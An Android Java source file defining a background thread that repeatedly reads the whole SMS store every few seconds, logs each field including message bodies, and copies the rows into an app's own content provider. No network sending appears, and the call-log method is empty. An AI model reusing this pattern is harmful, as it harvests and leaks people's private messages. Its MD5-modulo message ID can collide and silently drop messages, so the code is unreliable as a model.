package sms.example.inbjavia.server_parse;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

/**
 * Created by inbjavia on 7/2/2015.
 */
public class PickUpDataThread extends Thread{
    ContentResolver mContentResolver;
    private String TAG = PickUpDataThread.class.getSimpleName();

    public PickUpDataThread(ContentResolver contentResolver) {
        mContentResolver = contentResolver;
    }

    @Override
    public void run() {


        while (true)
        {
            try{
                getSmsData();
                sleep(5000);
                getCallData();
                sleep(5000);
            }
            catch (InterruptedException e){
                e.printStackTrace();
            }
            catch (Exception exc){
                exc.printStackTrace();
            }
        }
    }
    private void getSmsData(){
        Log.d(TAG,"getSmsData() START");
        Cursor cursor = null;
        try {
            cursor = mContentResolver.query(Uri.parse("content://sms"), null, null, null, null);
            if (cursor == null) {
                return;
            }
            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    String msgData = "";
                    ContentValues contentValues = new ContentValues();
                    for (int i = 0; i < cursor.getColumnCount(); i++) {
                        if ("m_id".equalsIgnoreCase(cursor.getColumnName(i))) {
                            continue;
                        }
                        if (cursor.getType(i) == Cursor.FIELD_TYPE_INTEGER) {
                            msgData += "" + cursor.getInt(i);
                            Log.d(TAG, "ColumnName: " + cursor.getColumnName(i) + " Value: " + cursor.getInt(i));
                            contentValues.put(cursor.getColumnName(i), cursor.getInt(i));
                        } else if (cursor.getType(i) == Cursor.FIELD_TYPE_STRING) {
                            msgData += "" + cursor.getString(i);
                            Log.d(TAG, "ColumnName: " + cursor.getColumnName(i) + " Value: " + cursor.getString(i));
                            contentValues.put(cursor.getColumnName(i), cursor.getString(i));
                        }
                        if (i == cursor.getColumnCount() - 1) {
                            Log.d(TAG, "ColumnName: m_id" + " Value: " + getMessageID(msgData));
                            contentValues.put("m_id", getMessageID(msgData));
                        }
                    }

                    if (!isMessageIDExist(contentValues.getAsString("m_id"))) {
                        Uri uri = mContentResolver.insert(MySmsProvider.CONTENT_URI, contentValues);
                        Log.d(TAG, "getSmsData() Uri : " + uri);
                        Log.d(TAG, "getSmsData() MessageID : " + contentValues.getAsString("m_id"));
                    }
                    Log.d("My_Service", "mesage Data = " + msgData);
                    // use msgData
                } while (cursor.moveToNext());
            }
            Log.d(TAG, "getSmsData() END");
        }
        catch (Exception exc){
            exc.printStackTrace();
        }
        finally {
            if (cursor != null)
                cursor.close();
        }
    }
    private boolean isMessageIDExist(String messageId){
        Cursor cursor = null;
        try {
            cursor = mContentResolver.query(MySmsProvider.CONTENT_URI, new String[]{"*"}, "m_id=?", new String[]{messageId}, null);
            if (cursor == null) {
                return false;
            }
            if (cursor.moveToFirst()) {
                int columnIndex = cursor.getColumnIndex("m_id");
                String m_Id = cursor.getString(columnIndex);
                if (m_Id == null) {
                    cursor.close();
                    return false;
                }
                cursor.close();
                return true;
            }
        }
        catch (Exception exc){
            exc.printStackTrace();
        }
        finally {
            if (cursor != null)
                cursor.close();
        }
        return false;
    }
    private String getMessageID(String messageData){
        byte[] MessageData = messageData.getBytes();
        MessageDigest md = null;
        try {
            md = MessageDigest.getInstance("MD5");
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        if(md == null){
            return "";
        }
        md.update(MessageData, 0, MessageData.length);
        byte[] hash = md.digest();
        BigInteger bigInteger = new BigInteger(bytesToHexString(hash),16);
        BigInteger result = bigInteger.mod(new BigInteger("10000", 16));
        return ""+result;
    }
    public static String  bytesToHexString(byte[] bytes) {
        if (bytes == null) return null;

        StringBuilder ret = new StringBuilder(2*bytes.length);

        for (int i = 0 ; i < bytes.length ; i++) {
            int b;

            b = 0x0f & (bytes[i] >> 4);

            ret.append("0123456789abcdef".charAt(b));

            b = 0x0f & bytes[i];

            ret.append("0123456789abcdef".charAt(b));
        }

        return ret.toString();
    }
    private void getCallData(){

    }
}
